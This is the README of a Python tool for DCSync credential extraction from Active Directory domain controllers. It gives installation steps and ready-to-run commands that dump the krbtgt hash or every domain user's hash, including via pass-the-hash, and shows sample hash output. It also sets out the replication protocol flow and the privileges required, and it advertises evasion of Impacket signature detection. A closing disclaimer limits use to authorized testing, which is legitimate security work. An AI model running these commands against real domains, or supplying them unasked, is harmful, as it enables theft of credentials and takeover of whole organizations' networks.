# DCRipper

![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)

A pure Python implementation of the MS-DRSR (Directory Replication Service Remote Protocol) for Active Directory credential extraction. Built from scratch without Impacket dependencies.

## Overview

DCRipper performs DCSync attacks by implementing the Windows Directory Replication Service protocol from the ground up. It includes custom implementations of:

- **DCE/RPC** - Remote procedure call protocol
- **NDR** - Network Data Representation serialization
- **NTLM** - NT LAN Manager authentication
- **MS-DRSR** - Directory Replication Service Remote Protocol

## Features

- Zero Impacket dependencies
- Single user or full domain extraction
- Pass-the-Hash authentication
- TCP and SMB transport
- Hashcat-compatible output

## Installation

```bash
git clone https://github.com/kypvas/dcripper.git
cd dcripper
pip install pycryptodome
```

## Usage

```bash
# Dump krbtgt
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123

# Dump all users
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -a

# Pass-the-Hash
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -H :ntlmhash

# Save output
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -a -o hashes.txt
```

## Options

| Option | Description |
|--------|-------------|
| `-dc` | Domain controller IP or hostname |
| `-d` | Domain name |
| `-u` | Username |
| `-p` | Password |
| `-H` | NTLM hash |
| `-t` | Target user (default: krbtgt) |
| `-a` | Dump all users |
| `-o` | Output file |
| `-f` | Format: `hashcat`, `json` |
| `-v` | Verbose |

## Output Format

```
DOMAIN\administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DOMAIN\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:155f4bc3b5615e06116a605a1d887eaa:::
```

## Protocol Flow

```
┌──────────┐                              ┌────────────┐
│ DCRipper │                              │     DC     │
└────┬─────┘                              └─────┬──────┘
     │  1. EPM Map (port 135)                   │
     ├─────────────────────────────────────────>│
     │  2. NTLM Auth + RPC Bind                 │
     ├─────────────────────────────────────────>│
     │  3. DRSBind                              │
     ├─────────────────────────────────────────>│
     │  4. DRSGetNCChanges (EXOP_REPL_SECRETS)  │
     ├─────────────────────────────────────────>│
     │  5. Encrypted credentials                │
     │<─────────────────────────────────────────┤
     │  6. RC4 + DES decryption (local)         │
     └──────────────────────────────────────────┘
```

## Required Privileges

- Domain Admins / Enterprise Admins
- Replicating Directory Changes All

## Detection

Evades signature-based detection for Impacket. Behavioral detection (Event ID 4662) will still log replication activity.

## Documentation

See [IMPLEMENTATION.md](IMPLEMENTATION.md) for detailed protocol documentation.

## Disclaimer

For authorized penetration testing and security research only. Unauthorized use is prohibited.

## License

MIT
